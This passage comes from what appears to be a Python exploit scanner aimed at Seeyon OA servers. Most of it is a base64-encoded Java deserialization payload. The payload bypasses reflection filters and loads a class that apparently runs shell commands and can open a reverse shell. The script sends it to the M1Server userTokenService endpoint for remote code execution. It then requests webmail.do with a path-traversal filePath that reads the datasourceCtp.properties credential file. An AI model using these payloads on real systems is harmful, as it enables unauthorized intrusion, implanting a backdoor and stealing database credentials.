mxlY3Rpb24iKTsKICB9CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGFzc0J1ZmZlciA9IHJlZmxlY3Rpb25DbGFzcy5nZXRSZXNvdXJjZUFzU3RyZWFtKCJSZWZsZWN0aW9uLmNsYXNzIikucmVhZEFsbEJ5dGVzKCk7CiAgdmFyIHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcyA9IHVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhyZWZsZWN0aW9uQ2xhc3MsIGNsYXNzQnVmZmVyLCBudWxsKTsKICB2YXIgZmllbGRGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpOwogIHZhciBtZXRob2RGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTsKICBpZiAoZmllbGRGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQoZmllbGRGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIGlmIChtZXRob2RGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQobWV0aG9kRmlsdGVyTWFwRmllbGQpLCBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKS5nZXRDb25zdHJ1Y3RvcigpLm5ld0luc3RhbmNlKCkpOwogIH0KICByZW1vdmVDbGFzc0NhY2hlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKSk7Cn0KZnVuY3Rpb24gc2V0QWNjZXNzaWJsZShhY2Nlc3NpYmxlT2JqZWN0KXsKICAgIHZhciB1bnNhZmUgPSBnZXRVbnNhZmUoKTsKICAgIHZhciBvdmVycmlkZUZpZWxkID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5yZWZsZWN0LkFjY2Vzc2libGVPYmplY3QiKS5nZXREZWNsYXJlZEZpZWxkKCJvdmVycmlkZSIpOwogICAgdmFyIG9mZnNldCA9IHVuc2FmZS5vYmplY3RGaWVsZE9mZnNldChvdmVycmlkZUZpZWxkKTsKICAgIHVuc2FmZS5wdXRCb29sZWFuKGFjY2Vzc2libGVPYmplY3QsIG9mZnNldCwgdHJ1ZSk7Cn0KZnVuY3Rpb24gZGVmaW5lQ2xhc3MoYnl0ZXMpewogIHZhciBjbHogPSBudWxsOwogIHZhciB2ZXJzaW9uID0gamF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgiamF2YS52ZXJzaW9uIik7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpCiAgdmFyIGNsYXNzTG9hZGVyID0gbmV3IGphdmEubmV0LlVSTENsYXNzTG9hZGVyKGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLm5ldC5VUkwiKSwgMCkpOwogIHRyeXsKICAgIGlmICh2ZXJzaW9uLnNwbGl0KCIuIilbMF0gPj0gMTEpIHsKICAgICAgYnlwYXNzUmVmbGVjdGlvbkZpbHRlcigpOwogICAgZGVmaW5lQ2xhc3NNZXRob2QgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLkNsYXNzTG9hZGVyIikuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoIltCIiksamF2YS5sYW5nLkludGVnZXIuVFlQRSwgamF2YS5sYW5nLkludGVnZXIuVFlQRSk7CiAgICBzZXRBY2Nlc3NpYmxlKGRlZmluZUNsYXNzTWV0aG9kKTsKICAgIC8vIOe7lei/hyBzZXRBY2Nlc3NpYmxlIAogICAgY2x6ID0gZGVmaW5lQ2xhc3NNZXRob2QuaW52b2tlKGNsYXNzTG9hZGVyLCBieXRlcywgMCwgYnl0ZXMubGVuZ3RoKTsKICAgIH1lbHNlewogICAgICB2YXIgcHJvdGVjdGlvbkRvbWFpbiA9IG5ldyBqYXZhLnNlY3VyaXR5LlByb3RlY3Rpb25Eb21haW4obmV3IGphdmEuc2VjdXJpdHkuQ29kZVNvdXJjZShudWxsLCBqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5zZWN1cml0eS5jZXJ0LkNlcnRpZmljYXRlIiksIDApKSwgbnVsbCwgY2xhc3NMb2FkZXIsIFtdKTsKICAgICAgY2x6ID0gdW5zYWZlLmRlZmluZUNsYXNzKG51bGwsIGJ5dGVzLCAwLCBieXRlcy5sZW5ndGgsIGNsYXNzTG9hZGVyLCBwcm90ZWN0aW9uRG9tYWluKTsKICAgIH0KICB9Y2F0Y2goZXJyb3IpewogICAgZXJyb3IucHJpbnRTdGFja1RyYWNlKCk7CiAgfWZpbmFsbHl7CiAgICByZXR1cm4gY2x6OwogIH0KfQpmdW5jdGlvbiBiYXNlNjREZWNvZGVUb0J5dGUoc3RyKSB7CiAgdmFyIGJ0OwogIHRyeSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIikubmV3SW5zdGFuY2UoKS5kZWNvZGVCdWZmZXIoc3RyKTsKICB9IGNhdGNoIChlKSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0IikubmV3SW5zdGFuY2UoKS5nZXREZWNvZGVyKCkuZGVjb2RlKHN0cik7CiAgfQogIHJldHVybiBidDsKfQp2YXIgY29kZT0ieXY2NnZnQUFBQzhCWndvQUlBQ1NCd0NUQndDVUNnQUNBSlVLQUFNQWxnb0FJZ0NYQ2dDWUFKa0tBSmdBbWdvQUlnQ2JDQUNjQ2dBZ0FKMEtBSjRBbndvQW5nQ2dCd0NoQ2dDWUFLSUlBSXdLQUNrQW93Z0FwQWdBcFFjQXBnZ0Fwd2dBcUFjQXFRb0FJQUNxQ0FDckNBQ3NCd0N0Q3dBYkFLNExBQnNBcndnQXNBZ0FzUWNBc2dvQUlBQ3pCd0MwQ2dDMUFMWUlBTGNKQUg0QXVBZ0F1UW9BZmdDNkNBQzdCd0M4Q2dCK0FMMEtBQ2tBdmdnQXZ3a0FMZ0RBQndEQkNnQXVBTUlJQU1NS0FINEF4QW9BSUFERkNBREdDUUIrQU1jSUFNZ0tBQ0FBeVFnQXlnY0F5d2dBekFnQXpRb0FtQURPQ2dEUEFNUUlBTkFLQUNrQTBRZ0EwZ29BS1FEVENBRFVDZ0FwQU5VS0FDa0ExZ2dBMXdvQUtRRFlDQURaQ2dBdUFOb0tBSDRBMndnQTNBb0FmZ0RkQ0FEZUNnRGZBT0FLQUNrQTRRZ0E0Z2dBNHdnQTVBY0E1UW9BVVFDWENnQlJBT1lJQU9jS0FGRUE2QWdBNlFnQTZnZ0E2d2dBN0FvQTdRRHVDZ0R0QU84SEFQQUtBUEVBOGdvQVhBRHpDQUQwQ2dCY0FQVUtBRndBOWdvQVhBRDNDZ0R4QVBnS0FQRUErUW9BT0FEb0NBRDZDZ0FwQUpZSUFQc0tBTzBBL0FjQS9Rb0FMZ0QrQ2dCcUFQOEtBR29BOGdvQThRRUFDZ0JxQVFBS0FHb0JBUW9CQWdFRENnRUNBUVFLQVFVQkJnb0JCUUVIQlFBQUFBQUFBQUF5Q2dDWUFRZ0tBUEVCQ1FvQWFnRUtDQUVMQ2dBNEFKVUlBUXdJQVEwSEFRNEJBQlpqYkdGemN5UnFZWFpoSkd4aGJtY2tVM1J5YVc1bkFRQVJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQWxUZVc1MGFHVjBhV01CQUFkaGNuSmhlU1JDQVFBR1BHbHVhWFErQVFBREtDbFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFDa1Y0WTJWd2RHbHZibk1CQUFsc2IyRmtRMnhoYzNNQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFIWlhobFkzVjBaUUVBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUVaWGhsWXdFQUIzSmxkbVZ5YzJVQkFEa29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFaamJHRnpjeVFCQUFwVGIzVnlZMlZHYVd4bEFRQUhRVFF1YW1GMllRd0JEd0NKQVFBZ2FtRjJZUzlzWVc1bkwwTnNZWE56VG05MFJtOTFibVJGZUdObGNIUnBiMjRCQUI1cVlYWmhMMnhoYm1jdlRtOURiR0Z6YzBSbFprWnZkVzVrUlhKeWIzSU1BUkFCRVF3QWd3RVNEQUNEQUlRSEFSTU1BUlFCRlF3QkZnRVhEQUVZQVJrQkFBZDBhSEpsWVdSekRBRWFBUnNIQVJ3TUFSMEJIZ3dCSHdFZ0FRQVRXMHhxWVhaaEwyeGhibWN2VkdoeVpXRmtPd3dCSVFFUkRBRWlBU01CQUFSb2RIUndBUUFHZEdGeVoyVjBBUUFTYW1GMllTOXNZVzVuTDFKMWJtNWhZbXhsQVFBR2RHaHBjeVF3QVFBSGFHRnVaR3hsY2dFQUhtcGhkbUV2YkdGdVp5OU9iMU4xWTJoR2FXVnNaRVY0WTJWd2RHbHZiZ3dCSkFFWkFRQUdaMnh2WW1Gc0FRQUtjSEp2WTJWemMyOXljd0VBRG1waGRtRXZkWFJwYkM5TWFYTjBEQUVsQVNZTUFSOEJKd0VBQTNKbGNRRUFDMmRsZEZKbGMzQnZibk5sQVFBUGFtRjJZUzlzWVc1bkwwTnNZWE56REFFb0FTa0JBQkJxWVhaaEwyeGhibWN2VDJKcVpXTjBCd0VxREFFckFTd0JBQWxuWlhSSVpXRmtaWElNQUg4QWdBRUFFR3BoZG1FdWJHRnVaeTVUZEhKcGJtY01BSThBaVFFQUEyTnRaQUVBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNNQUlvQWl3d0JMUUV1QVFBSmMyVjBVM1JoZEhWekRBRXZBSUFCQUJGcVlYWmhMMnhoYm1jdlNXNTBaV2RsY2d3QWd3RXdBUUFrYjNKbkxtRndZV05vWlM1MGIyMWpZWFF1ZFhScGJDNWlkV1l1UW5sMFpVTm9kVzVyREFDSUFJa01BVEVCTWdFQUNITmxkRUo1ZEdWekRBQ0NBSUFCQUFKYlFnd0JNd0VwQVFBSFpHOVhjbWwwWlFFQUUycGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNEJBQk5xWVhaaExtNXBieTVDZVhSbFFuVm1abVZ5QVFBRWQzSmhjQXdCTkFFMUJ3RTJBUUFBREFFM0FUZ0JBQkJqYjIxdFlXNWtJRzV2ZENCdWRXeHNEQUU1QVJFQkFBVWpJeU1qSXd3Qk9nRTdEQUU4QVQwQkFBRTZEQUUrQVQ4QkFDSmpiMjF0WVc1a0lISmxkbVZ5YzJVZ2FHOXpkQ0JtYjNKdFlYUWdaWEp5YjNJaERBRkFBVUVNQUkwQWpnRUFCVUJBUUVCQURBQ01BSXNCQUFkdmN5NXVZVzFsQndGQ0RBRkRBSXNNQVVRQkVRRUFBM2RwYmdFQUJIQnBibWNCQUFJdGJnRUFGbXBoZG1FdmJHRnVaeTlUZEhKcGJtZENkV1ptWlhJTUFVVUJSZ0VBQlNBdGJpQTBEQUZIQVJFQkFBSXZZd0VBQlNBdGRDQTBBUUFDYzJnQkFBSXRZd2NCU0F3QlNRRktEQUNNQVVzQkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnY0JUQXdCVFFGT0RBQ0RBVThCQUFKY1lRd0JVQUZSREFGU0FWTU1BVlFCRVF3QlZRRk9EQUZXQUlRQkFBY3ZZbWx1TDNOb0FRQUhZMjFrTG1WNFpRd0FqQUZYQVFBUGFtRjJZUzl1WlhRdlUyOWphMlYwREFGWUFTWU1BSU1CV1F3QldnRmJEQUZjQVZNSEFWME1BVjRCSmd3Qlh3RW1Cd0ZnREFGaEFUQU1BV0lBaEF3Qll3RmtEQUZsQVNZTUFXWUFoQUVBSFhKbGRtVnljMlVnWlhobFkzVjBaU0JsY25KdmNpd2diWE5uSUMwK0FRQUJJUUVBRTNKbGRtVnljMlVnWlhobFkzVjBaU0J2YXlFQkFBSkJOQUVBQjJadmNrNWhiV1VCQUFwblpYUk5aWE56WVdkbEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQkJxWVhaaEwyeGhibWN2VkdoeVpXRmtBUUFOWTNWeWNtVnVkRlJvY21WaFpBRUFGQ2dwVEdwaGRtRXZiR0Z1Wnk5VWFISmxZV1E3QVFBT1oyVjBWR2h5WldGa1IzSnZkWEFCQUJrb0tVeHFZWFpoTDJ4aGJtY3ZWR2h5WldGa1IzSnZkWEE3QVFBSVoyVjBRMnhoYzNNQkFCTW9LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFRWjJWMFJHVmpiR0Z5WldSR2FXVnNaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrT3dFQUYycGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrQVFBTmMyVjBRV05qWlhOemFXSnNaUUVBQkNoYUtWWUJBQU5uWlhRQkFDWW9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQjJkbGRFNWhiV1VCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFEV2RsZEZOMWNHVnlZMnhoYzNNQkFBUnphWHBsQVFBREtDbEpBUUFWS0VrcFRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUpaMlYwVFdWMGFHOWtBUUJBS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzF0TWFtRjJZUzlzWVc1bkwwTnNZWE56T3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrT3dFQUdHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwMWxkR2h2WkFFQUJtbHVkbTlyWlFFQU9TaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREdGJUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQ0dkbGRFSjVkR1Z6QVFBRUtDbGJRZ0VBQkZSWlVFVUJBQVFvU1NsV0FRQUxibVYzU1c1emRHRnVZMlVCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFFV2RsZEVSbFkyeGhjbVZrVFdWMGFHOWtBUUFWWjJWMFEyOXVkR1Y0ZEVOc1lYTnpURzloWkdWeUFRQVpLQ2xNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUJtVnhkV0ZzY3dFQUZTaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BXZ0VBQkhSeWFXMEJBQXB6ZEdGeWRITlhhWFJvQVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bGFBUUFIY21Wd2JHRmpaUUVBUkNoTWFtRjJZUzlzWVc1bkwwTm9ZWEpUWlhGMVpXNWpaVHRNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFGYzNCc2FYUUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1Z0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBZDJZV3gxWlU5bUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDBsdWRHVm5aWEk3QVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUMyZGxkRkJ5YjNCbGNuUjVBUUFMZEc5TWIzZGxja05oYzJVQkFBWmhjSEJsYm1RQkFDd29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZtWm1WeU93RUFDSFJ2VTNSeWFXNW5BUUFSYW1GMllTOXNZVzVuTDFKMWJuUnBiV1VCQUFwblpYUlNkVzUwYVcxbEFRQVZLQ2xNYW1GMllTOXNZVzVuTDFKMWJuUnBiV1U3QVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUIyaGhjMDVsZUhRQkFBTW9LVm9CQUFSdVpYaDBBUUFPWjJWMFJYSnliM0pUZEhKbFlXMEJBQWRrWlhOMGNtOTVBUUFuS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxQnliMk5sYzNNN0FRQUlhVzUwVm1Gc2RXVUJBQllvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3U1NsV0FRQVBaMlYwVDNWMGNIVjBVM1J5WldGdEFRQVlLQ2xNYW1GMllTOXBieTlQZFhSd2RYUlRkSEpsWVcwN0FRQUlhWE5EYkc5elpXUUJBQk5xWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0QVFBSllYWmhhV3hoWW14bEFRQUVjbVZoWkFFQUZHcGhkbUV2YVc4dlQzVjBjSFYwVTNSeVpXRnRBUUFGZDNKcGRHVUJBQVZtYkhWemFBRUFCWE5zWldWd0FRQUVLRW9wVmdFQUNXVjRhWFJXWVd4MVpRRUFCV05zYjNObEFDRUFmZ0FpQUFBQUFnQUlBSDhBZ0FBQkFJRUFBQUFBQUFnQWdnQ0FBQUVBZ1FBQUFBQUFCZ0FCQUlNQWhBQUNBSVVBQUFRUkFBZ0FFUUFBQXRFcXR3QUd1QUFIdGdBSVRDdTJBQWtTQ3JZQUMwMHNCTFlBREN3cnRnQU53QUFPd0FBT1RnTTJCQlVFTGI2aUFxTXRGUVF5T2dVWkJjY0FCcWNDanhrRnRnQVBPZ1laQmhJUXRnQVJtZ0FOR1FZU0VyWUFFWm9BQnFjQ2NSa0Z0Z0FKRWhPMkFBdE5MQVMyQUF3c0dRVzJBQTA2QnhrSHdRQVVtZ0FHcHdKT0dRZTJBQWtTRmJZQUMwMHNCTFlBREN3WkI3WUFEVG9IR1FlMkFBa1NGcllBQzAybkFCWTZDQmtIdGdBSnRnQVl0Z0FZRWhhMkFBdE5MQVMyQUF3c0dRZTJBQTA2QnhrSHRnQUp0Z0FZRWhtMkFBdE5wd0FRT2dnWkI3WUFDUkladGdBTFRTd0V0Z0FNTEJrSHRnQU5PZ2NaQjdZQUNSSWF0Z0FMVFN3RXRnQU1MQmtIdGdBTndBQWJ3QUFiT2dnRE5na1ZDUmtJdVFBY0FRQ2lBYWdaQ0JVSnVRQWRBZ0E2Q2hrS3RnQUpFaDYyQUF0TkxBUzJBQXdzR1FxMkFBMDZDeGtMdGdBSkVoOER2UUFndGdBaEdRc0R2UUFpdGdBak9nd1pDN1lBQ1JJa0JMMEFJRmtEc2dBbHh3QVBFaWE0QUNkWnN3QWxwd0FHc2dBbFU3WUFJUmtMQkwwQUlsa0RFaWhUdGdBandBQXBPZzBaRGNjQUJxY0JKU29aRGJZQUtyWUFLem9PR1F5MkFBa1NMQVM5QUNCWkE3SUFMVk8yQUNFWkRBUzlBQ0paQTdzQUxsa1JBTWkzQUM5VHRnQWpWeW9TTUxZQU1Ub1BHUSsyQURJNkJ4a1BFak1HdlFBZ1dRT3lBRFRIQUE4U05iZ0FKMW16QURTbkFBYXlBRFJUV1FTeUFDMVRXUVd5QUMxVHRnQTJHUWNHdlFBaVdRTVpEbE5aQkxzQUxsa0R0d0F2VTFrRnV3QXVXUmtPdnJjQUwxTzJBQ05YR1F5MkFBa1NOd1M5QUNCWkF4a1BVN1lBSVJrTUJMMEFJbGtER1FkVHRnQWpWNmNBWWpvUEtoSTV0Z0F4T2hBWkVCSTZCTDBBSUZrRHNnQTB4d0FQRWpXNEFDZFpzd0EwcHdBR3NnQTBVN1lBTmhrUUJMMEFJbGtER1E1VHRnQWpPZ2NaRExZQUNSSTNCTDBBSUZrREdSQlR0Z0FoR1F3RXZRQWlXUU1aQjFPMkFDTlhwd0FYaEFrQnAvNVNwd0FJT2dhbkFBT0VCQUduL1Z5eEFBZ0Fsd0NpQUtVQUZ3REZBTk1BMWdBWEFkQUNWd0phQURnQU5nQTdBc1VBT0FBK0FGa0N4UUE0QUZ3QWZBTEZBRGdBZndLNUFzVUFPQUs4QXNJQ3hRQTRBQUVBaGdBQUFPNEFPd0FBQUEwQUJBQU9BQXNBRHdBVkFCQUFHZ0FSQUNZQUV3QXdBQlFBTmdBV0FENEFGd0JGQUJnQVhBQVpBR2NBR2dCc0FCc0FkQUFjQUg4QUhRQ0tBQjRBandBZkFKY0FJUUNpQUNRQXBRQWlBS2NBSXdDNEFDVUF2UUFtQU1VQUtBRFRBQ3NBMWdBcEFOZ0FLZ0RqQUN3QTZBQXRBUEFBTGdEN0FDOEJBQUF3QVE0QU1RRWRBRElCS0FBekFUTUFOQUU0QURVQlFBQTJBVmtBTndHU0FEZ0Jsd0E1QVpvQU93R2xBRHdCMEFBK0FkZ0FQd0hmQUVBQ05RQkJBbGNBUmdKYUFFSUNYQUJEQW1RQVJBS1hBRVVDdVFCSEFyd0FNUUxDQUVzQ3hRQkpBc2NBU2dMS0FCTUMwQUJOQUljQUFBQUVBQUVBT0FBQkFJZ0FpUUFDQUlVQUFBQTVBQUlBQXdBQUFCRXJ1QUFCc0UyNEFBZTJBRHNydGdBOHNBQUJBQUFBQkFBRkFBSUFBUUNHQUFBQURnQURBQUFBVndBRkFGZ0FCZ0JaQUljQUFBQUVBQUVBQWdBQkFJb0Fpd0FCQUlVQUFBQ1BBQVFBQXdBQUFGY3J4Z0FNRWowcnRnQSttUUFHRWord0s3WUFRRXdyRWtHMkFFS1pBQ2dyRWtFU1BiWUFReEpFdGdCRlRTeStCWjhBQmhKR3NDb3NBeklzQkRLNEFFZTJBRWl3S2lzU1FSSTl0Z0JERWtrU1BiWUFRN1lBU3JBQUFBQUJBSVlBQUFBbUFBa0FBQUJqQUEwQVpBQVFBR1lBRlFCbkFCNEFhUUFzQUdvQU1nQnJBRFVBYlFCREFHOEFBUUNNQUlzQUFRQ0ZBQUFCeWdBRUFBa0FBQUVxRWt1NEFFeTJBRTFOSzdZQVFFd0JUZ0U2QkN3U1RyWUFFWmtBUUNzU1Q3WUFFWmtBSUNzU1VMWUFFWm9BRjdzQVVWbTNBRklydGdCVEVsUzJBRk8yQUZWTUJyMEFLVmtERWloVFdRUVNWbE5aQlN0VE9nU25BRDByRWsrMkFCR1pBQ0FyRWxDMkFCR2FBQmU3QUZGWnR3QlNLN1lBVXhKWHRnQlR0Z0JWVEFhOUFDbFpBeEpZVTFrRUVsbFRXUVVyVXpvRXVBQmFHUVMyQUZ0T3V3QmNXUzIyQUYyM0FGNFNYN1lBWURvRkdRVzJBR0daQUFzWkJiWUFZcWNBQlJJOU9nYTdBRnhaTGJZQVk3Y0FYaEpmdGdCZ09nVzdBRkZadHdCU0dRYTJBRk1aQmJZQVlaa0FDeGtGdGdCaXB3QUZFajIyQUZPMkFGVTZCaGtHT2djdHhnQUhMYllBWkJrSHNEb0ZHUVcyQUdVNkJpM0dBQWN0dGdCa0dRYXdPZ2d0eGdBSExiWUFaQmtJdndBRUFKTUEvZ0VKQURnQWt3RCtBUjBBQUFFSkFSSUJIUUFBQVIwQkh3RWRBQUFBQVFDR0FBQUFiZ0FiQUFBQWN3QUpBSFFBRGdCMUFCQUFkZ0FUQUhjQUhBQjRBQzRBZVFCQ0FIc0FXUUI5QUdzQWZnQi9BSUFBa3dDREFKd0FoQUN1QUlVQXdnQ0dBTlFBaHdENkFJZ0EvZ0NNQVFJQWpRRUdBSWdCQ1FDSkFRc0FpZ0VTQUl3QkZnQ05BUm9BaWdFZEFJd0JJd0NOQUFFQWpRQ09BQUVBaFFBQUFZTUFCQUFNQUFBQTh4Skx1QUJNdGdCTkVrNjJBQkdhQUJDN0FDbFpFbWEzQUdkT3B3QU51d0FwV1JKb3R3Qm5UcmdBV2kyMkFHazZCTHNBYWxrckxMWUFhN2NBYkRvRkdRUzJBRjA2QmhrRXRnQmpPZ2NaQmJZQWJUb0lHUVMyQUc0NkNSa0Z0Z0J2T2dvWkJiWUFjSm9BWUJrR3RnQnhuZ0FRR1FvWkJyWUFjcllBYzZmLzdoa0h0Z0J4bmdBUUdRb1pCN1lBY3JZQWM2Zi83aGtJdGdCeG5nQVFHUWtaQ0xZQWNyWUFjNmYvN2hrS3RnQjBHUW0yQUhRVUFIVzRBSGNaQkxZQWVGZW5BQWc2QzZmL25oa0V0Z0JrR1FXMkFIbW5BQ0JPdXdCUldiY0FVaEo2dGdCVExiWUFlN1lBVXhKOHRnQlR0Z0JWc0JKOXNBQUNBTGdBdmdEQkFEZ0FBQURRQU5NQU9BQUJBSVlBQUFCdUFCc0FBQUNiQUJBQW5BQWRBSjRBSndDZ0FEQUFvUUErQUtJQVV3Q2pBR0VBcEFCcEFLVUFjUUNtQUg0QXFBQ0dBS2tBa3dDckFKc0FyQUNvQUs0QXJRQ3ZBTElBc0FDNEFMSUF2Z0N6QU1FQXRBRERBTFVBeGdDM0FNc0F1QURRQUxzQTB3QzVBTlFBdWdEd0FMd0FDQUNQQUlrQUFnQ0ZBQUFBTWdBREFBSUFBQUFTS3JnQUFiQk11d0FEV1N1MkFBUzNBQVcvQUFFQUFBQUVBQVVBQWdBQkFJWUFBQUFHQUFFQUFBQTNBSUVBQUFBQUFBRUFrQUFBQUFJQWtRPT0iOwpjbHogPSBkZWZpbmVDbGFzcyhiYXNlNjREZWNvZGVUb0J5dGUoY29kZSkpOwpjbHoubmV3SW5zdGFuY2UoKTt0AARldmFsdXEAfgAbAAAAAXEAfgAjc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=)}}'
            seeyon_usertokenservice_res = requests.post(url+seeyon_usertokenservice_dir,headers=hearder1,data=data,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyon_usertokenservice_res.encoding='utf-8'
            seeyon_usertokenservice_res_text = seeyon_usertokenservice_res.text
            if seeyon_usertokenservice_res.status_code == 200 and 'Test' in seeyon_usertokenservice_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyon_usertokenservice_dir+" "+"存在致远OA M1Server userTokenService 远程命令执行漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA M1Server userTokenService 远程命令执行漏洞")
        except:
            pass

        # ⑥、致远OA webmail.do 任意文件下载 CNVD-2020-62422
        webmail_filedownload_dir = "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
        try:
           # 忽略ssl证书验证
            webmail_filedownload_dir_res = requests.get(url+webmail_filedownload_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            webmail_filedownload_dir_res.encoding='utf-8'
            webmail_filedownload_dir_res_text = webmail_filedownload_dir_res.text
            
            if webmail_filedownload_dir_res.status_code == 200 and   'workflow' in webmail_filedownload_dir_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+webmail_filedownload_dir+" "+"存在致远OA webmail.do 任意文件下载 CNVD-2020-62422")
            else:
